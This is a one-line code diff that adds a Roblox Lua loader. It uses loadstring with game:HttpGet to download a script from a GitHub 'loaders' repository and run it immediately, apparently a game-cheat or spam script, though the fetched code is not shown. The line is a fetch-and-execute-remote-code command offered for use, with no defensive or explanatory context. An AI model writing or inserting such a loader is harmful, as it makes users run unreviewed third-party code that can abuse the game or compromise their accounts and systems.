@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/kukirin-life-testing-spam1-7ifevec6dx3lkj.lua"))()
